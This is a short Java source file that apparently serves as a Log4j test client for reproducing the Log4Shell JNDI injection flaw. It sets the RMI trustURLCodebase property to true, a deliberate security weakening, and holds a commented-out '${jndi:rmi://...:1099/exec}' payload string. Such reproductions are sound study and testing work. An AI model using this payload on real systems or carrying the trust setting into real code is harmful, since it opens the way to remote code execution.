package com.zl.service.client;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class LogClient {

    //private static final Logger log = LoggerFactory.getLogger(LogClient.class);

    static {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
    }
    static Logger log = LogManager.getLogger(LogClient.class);


    public static void main(String[] args) {
        //String attck = "${jndi:rmi://127.0.0.1:1099/exec}";
        log.info("{}","attck");
    }

}
